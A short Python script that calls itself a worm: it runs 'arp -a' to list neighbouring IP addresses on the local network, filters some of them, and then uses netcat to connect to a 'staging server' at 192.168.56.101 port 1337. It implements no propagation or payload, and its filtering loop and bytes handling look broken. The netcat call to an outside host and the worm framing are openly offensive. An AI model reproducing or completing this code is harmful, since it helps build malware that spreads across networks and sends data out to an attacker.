#!/usr/bin/env python

import subprocess
import re

def worm_spread():
 
    arp_list = subprocess.check_output(["arp", "-a"])

    pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'   
    
    ips = re.findall(pattern, arp_list)

    print(ips)

    for i in ips:
        if i.endswith(".1") == True:
            break
        elif i.endswith(".100") == True:
            break
        elif i.endswith(".101") == True:
            break
        else:
            print(i)

worm_spread()


def nc_listener():
    #sending to staging server via netcat
    subprocess.call(["nc", "192.168.56.101", "1337"])

print(nc_listener())
